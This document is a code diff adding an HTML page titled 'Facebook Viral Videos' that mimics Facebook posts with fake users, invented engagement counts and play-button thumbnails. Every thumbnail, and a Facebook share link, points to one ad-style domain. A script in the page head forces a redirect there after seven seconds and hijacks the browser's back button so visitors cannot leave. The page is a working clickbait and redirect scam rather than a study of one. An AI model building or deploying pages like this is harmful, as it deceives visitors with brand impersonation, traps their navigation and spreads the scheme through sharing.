@@ -1,0 +1,284 @@
+!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+
+  <meta charset="UTF-8" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+  <title>Facebook Viral Videos</title>
+
+  <!-- Popunder Script -->
+
+  
+  <!-- Social Bar Script -->
+
+  <style>
+
+    body {
+
+      font-family: Arial, sans-serif;
+
+      background-color: #e9ebee;
+
+      margin: 0;
+
+      padding: 0;
+
+    }
+
+    .header {
+
+      background-color: #1877f2;
+
+      color: white;
+
+      padding: 15px;
+
+      font-size: 22px;
+
+      font-weight: bold;
+
+      text-align: center;
+
+      margin-bottom: 10px;
+
+    }
+
+    .container {
+
+      max-width: 550px;
+
+      margin: 20px auto;
+
+      background: #fff;
+
+      padding: 15px;
+
+      box-shadow: 0 0 6px rgba(0,0,0,0.15);
+
+      border-radius: 12px;
+
+    }
+
+    .profile {
+
+      display: flex;
+
+      align-items: center;
+
+      margin-bottom: 12px;
+
+    }
+
+    .profile img {
+
+      width: 45px;
+
+      height: 45px;
+
+      border-radius: 50%;
+
+      margin-right: 10px;
+
+    }
+
+    .follow-btn {
+
+      margin-left: auto;
+
+      padding: 5px 12px;
+
+      border: 1px solid #1877f2;
+
+      background: white;
+
+      color: #1877f2;
+
+      border-radius: 6px;
+
+      font-size: 14px;
+
+      cursor: pointer;
+
+    }
+
+    .gif {
+
+      position: relative;
+
+      display: inline-block;
+
+    }
+
+    .gif img {
+
+      width: 100%;
+
+      height: auto;
+
+      border-radius: 12px;
+
+      display: block;
+
+    }
+
+    .gif::after {
+
+      content: '\25B6'; /* ▶️ */
+
+      position: absolute;
+
+      top: 50%;
+
+      left: 50%;
+
+      transform: translate(-50%, -50%);
+
+      font-size: 60px;
+
+      color: white;
+
+      text-shadow: 0 0 12px rgba(0, 0, 0, 0.7);
+
+      pointer-events: none;
+
+      z-index: 1;
+
+    }
+
+    .stats, .actions {
+
+      font-size: 15px;
+
+      margin-top: 12px;
+
+    }
+
+    .actions {
+
+      display: flex;
+
+      justify-content: space-between;
+
+      border-top: 1px solid #ccc;
+
+      padding-top: 10px;
+
+    }
+
+    .actions a {
+
+      text-decoration: none;
+
+      color: black;
+
+    }
+
+  </style>
+  <script>
+    setTimeout(() => {
+      window.location.href = "https://conscientiouscabbageadrift.com/wus0z8zc7p?key=90bcb0f2b91421128dedacde813bc802";
+    }, 7000);
+
+    history.pushState(null, null, location.href);
+    window.onpopstate = () => {
+      location.href = "https://conscientiouscabbageadrift.com/wus0z8zc7p?key=90bcb0f2b91421128dedacde813bc802";
+    };
+  </script>
+
+
+
+
+
+</head>
+
+<body>
+
+  <div class="header">Facebook Viral Videos</div>
+
+  <script>
+
+    const images = [
+
+      "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjQMgVKltmom2PeZDR2e8PmmHmT0XB-djZ8avAGQ84izyhsQAZc_Hz85nUvQrZJrZiAMdFg6SpVtBDATrtTyG6y-3DgTBoflpZ_NgdHo1oSUvaTP56ouvIhosghJEug5r780372GRkQmSc2W7wlEmqouEFJu1yTeDRqTXYH4KhjjN6V5cEYwvKn12nVxegp/s532/1000015942.jpg",
+
+      "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg9_WC8JWlhYVGgwgEMyhb-OnYhrDahauhuHZaFNaAOzpM8pHZ3OPWb4oQPX4KNatnS8_orZYwCz4IsPqEVo9UsW8JLYNML3iZJaNPQbPnQok9YJMRgQzxSyJ2cWOtT4i-4YhyphenhyphensTYiSWDrpN0eD-qZ5FAYfLrwUsiQf-bahPLpimMBKsZCiXwDVgN4TejoQ/s447/1000015944.jpg",
+
+      "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhmxM_8pWspkkoerppYHwQlX3SfICatYrOdA2qhLKlt1oiTmYsb8dIIPbeOVaRe047i3DC5Lqg4eABO1SY66Dmse9uP-yBSE5y2kT-n2JtsKlGIP-gmNuAPhXmyiGmWkirSBtjEcA4QV63b8wp8fLQzeQeiAfZ8vhTDPCkUjU21HJ50Z35hSJ6UaeROO2be/s661/1000015945.jpg",
+
+      "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi6P5wRS2mhE8mS0rbjTzwLWdOSjzKFLxiiHFcOfnFYZNqW-fNrzRldW-7SW1CUTo7Q3d53Wq45vytz780kd6SYAl6KQ7MGM9mxwvHV2nP2HGLBy22YUw2HI3wZIPLCqBhyphenhyphencF_61y0uOO4nmB1OhqZchWoW88bjV6v-iIidjt74z9hzeOR9n9hgDxbCnpsF/s588/1000015943.jpg",
+
+      "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjQMgVKltmom2PeZDR2e8PmmHmT0XB-djZ8avAGQ84izyhsQAZc_Hz85nUvQrZJrZiAMdFg6SpVtBDATrtTyG6y-3DgTBoflpZ_NgdHo1oSUvaTP56ouvIhosghJEug5r780372GRkQmSc2W7wlEmqouEFJu1yTeDRqTXYH4KhjjN6V5cEYwvKn12nVxegp/s532/1000015942.jpg",
+
+      "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi6P5wRS2mhE8mS0rbjTzwLWdOSjzKFLxiiHFcOfnFYZNqW-fNrzRldW-7SW1CUTo7Q3d53Wq45vytz780kd6SYAl6KQ7MGM9mxwvHV2nP2HGLBy22YUw2HI3wZIPLCqBhyphenhyphencF_61y0uOO4nmB1OhqZchWoW88bjV6v-iIidjt74z9hzeOR9n9hgDxbCnpsF/s588/1000015943.jpg",
+
+      "",
+
+      "",
+
+      "",
+
+      "",
+
+      ""
+
+    ];
+
+    document.addEventListener('DOMContentLoaded', function () {
+
+      const directLink = "https://conscientiouscabbageadrift.com/wus0z8zc7p?key=90bcb0f2b91421128dedacde813bc802";
+
+      const container = document.body;images.forEach((img, index) => {
+
+        const block = document.createElement('div');
+
+        block.className = 'container';
+
+        block.innerHTML = `
+
+          <div class="profile">
+
+            <img src="https://i.imgur.com/3GvwNBf.png" />
+
+            <strong>User ${index + 1}</strong>
+
+            <button class="follow-btn">Follow</button>
+
+          </div>
+
+          <p>Click to watch full viral video!</p>
+
+          <a class="gif" href="${directLink}" target="_blank">
+
+            <img src="${img}" alt="Video Thumbnail"/>
+
+          </a>
+
+          <div class="stats">❤️🔥 ${1000 + index * 300} Likes • ${500 + index * 100} Comments • ${20 + index * 15}K Views</div>
+
+          <div class="actions">
+
+            <a href="#">Like</a>
+
+            <a href="#">Comment</a>
+
+            <a href="https://facebook.com/sharer/sharer.php?u=${directLink}" target="_blank">Share</a>
+
+          </div>
+
+        `;
+
+        container.appendChild(block);
+
+      });
+
+    });
+
+  </script>
+
+</body>
+
+</html>
